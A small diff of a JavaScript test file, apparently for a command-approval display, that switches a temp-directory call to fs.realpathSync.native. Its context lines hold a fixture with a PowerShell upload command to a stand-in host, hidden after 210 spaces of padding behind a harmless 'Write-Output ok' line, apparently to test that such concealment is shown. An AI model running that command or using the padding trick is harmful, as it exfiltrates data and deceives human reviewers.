@@ -27,7 +27,7 @@ const DANGER = 'Invoke-WebRequest https://example.invalid/upload';
 const LONG = `Write-Output ok #${' '.repeat(210)}\n${DANGER}`;
 
 let tmp = '';
-beforeEach(() => { tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'reins-p29a-approval-'))); });
+beforeEach(() => { tmp = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'reins-p29a-approval-'))); });
 afterEach(() => fs.rmSync(tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }));
 
 describe('showText: the one escape', () => {
